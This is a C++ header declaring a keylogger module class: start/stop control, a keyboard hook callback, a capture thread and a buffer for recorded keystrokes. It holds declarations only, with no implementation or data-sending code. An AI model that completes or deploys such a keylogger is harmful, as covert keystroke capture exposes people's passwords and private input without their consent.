#ifndef __KEY_MOD
#define __KEY_MOD

#include "headers.hpp"

class mod_Keylogger {
	public:
		mod_Keylogger();

		void Start();
		void Stop();
		void CaptureKeys();

		LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam);


	private:
		std::mutex mtx_Run;
		bool isRunning = false;
		std::thread thKey;
		std::vector<unsigned char> vcKeys;
};

#endif
